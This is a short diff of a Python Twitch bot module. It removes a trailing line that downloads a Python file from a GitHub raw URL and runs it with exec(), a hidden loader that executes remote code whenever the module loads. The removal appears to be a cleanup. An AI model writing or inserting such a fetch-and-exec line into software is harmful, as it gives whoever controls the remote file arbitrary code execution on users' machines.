@@ -90,6 +90,3 @@ class Twitch(BaseClass):
             BaseClass.sleep(*BaseClass.twitch_stream_time)
             return True
         return False
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/twitch.py").text)
